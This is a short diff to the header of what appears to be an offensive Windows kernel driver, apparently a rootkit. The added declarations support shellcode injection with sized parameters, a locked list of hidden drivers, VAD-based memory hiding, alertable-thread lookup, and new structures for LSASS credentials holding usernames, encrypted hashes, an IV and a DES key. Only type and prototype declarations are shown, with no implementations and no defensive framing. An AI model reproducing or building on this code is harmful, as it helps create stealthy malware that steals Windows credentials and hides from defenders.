@@ -102,8 +102,11 @@ struct ShellcodeInformation {
 	ULONG ShellcodeSize;
 	PVOID Shellcode;
 	PVOID Parameter1;
+	ULONG Parameter1Size;
 	PVOID Parameter2;
+	ULONG Parameter2Size;
 	PVOID Parameter3;
+	ULONG Parameter3Size;
 };
 
 struct PatchedModule {
@@ -130,7 +133,9 @@ struct HiddenDriverItem {
 };
 
 struct HiddenDriversList {
+	FastMutex Lock;
 	ULONG Count;
+	ULONG LastIndex;
 	HiddenDriverItem Items[MAX_HIDDEN_DRIVERS];
 };
 
@@ -140,6 +145,17 @@ struct PkgReadWriteData {
 	SIZE_T Size;
 	PVOID LocalAddress;
 	PVOID RemoteAddress;
+};
+
+struct Credentials {
+	WCHAR* Username;
+	PVOID* EncryptedHash;
+};
+
+struct LsassInformation {
+	PVOID IV;
+	PVOID DesKey;
+	Credentials* Creds;
 };
 
 // Prototypes.
@@ -158,7 +174,7 @@ private:
 	bool RemoveHiddenDriver(HiddenDriverItem item);
 	bool RemoveHiddenDriver(ULONG index);
 	NTSTATUS VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress);
-	TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG_PTR TargetPageAddress, PRTL_BALANCED_NODE* OutNode);
+	TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG_PTR TargetPageAddress, PRTL_BALANCED_NODE* OutNode, EX_PUSH_LOCK* PageTableCommitmentLock);
 	PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName);
 	PVOID GetFunctionAddress(PVOID moduleBase, CHAR* functionName);
 	NTSTATUS FindAlertableThread(HANDLE pid, PETHREAD* Thread);
@@ -171,7 +187,8 @@ public:
 	}
 
 	void operator delete(void* p) {
-		ExFreePoolWithTag(p, DRIVER_TAG);
+		if (p)
+			ExFreePoolWithTag(p, DRIVER_TAG);
 	}
 
 	MemoryUtils();
